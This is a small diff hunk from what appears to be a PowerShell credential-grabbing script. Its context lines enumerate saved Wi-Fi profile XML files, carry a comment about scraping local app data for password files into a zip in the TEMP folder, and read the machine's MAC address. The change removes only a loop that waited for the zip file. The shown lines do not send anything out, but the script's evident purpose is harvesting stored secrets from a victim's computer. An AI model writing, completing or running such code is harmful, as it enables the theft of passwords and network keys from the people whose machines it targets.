@@ -23,9 +23,7 @@ Get-ChildItem "$e\Wi-Fi*.xml" | ForEach-Object {
 
 # Scrape the localappdata for password files (zipping as an example)
 $zip = "$env:TEMP\funny_stuff_folder.zip"
-while (-not (Test-Path $zip)) {
-    Start-Sleep -Seconds 1
-}
+
 
 
 $mac  = (Get-NetAdapter).MacAddress
